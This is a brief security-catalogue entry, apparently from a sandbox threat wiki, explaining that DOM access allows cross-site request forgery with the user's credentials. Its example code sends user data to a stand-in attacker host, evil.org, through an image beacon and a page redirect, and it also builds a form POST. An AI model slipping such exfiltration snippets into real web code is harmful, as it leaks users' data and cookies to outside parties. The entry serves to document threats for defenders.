# document object allows arbitrary XSRF with the user's credentials #

## Effect ##
Invoke web services with the user's cookies: XSRF


## Background ##
http://en.wikipedia.org/wiki/Cross-site_request_forgery defines cross-site request forgery.



## Assumptions ##
The DOM is directly accessible, or allows setting of URL attributes with arbitrary URLs.



## Versions ##
All



## Example ##
```
(new Image()).src = 'http://evil.org/phone_home?' + userData;

var form = document.createElement('form');
var input = document.createElement('input');
input.name = 'data';
input.value = userData;
form.appendChild(input);
form.method = 'POST';
form.submit();

document.location = 'http://evil.org/phone_home?' + userData;
// also iframes, style tags, etc.
```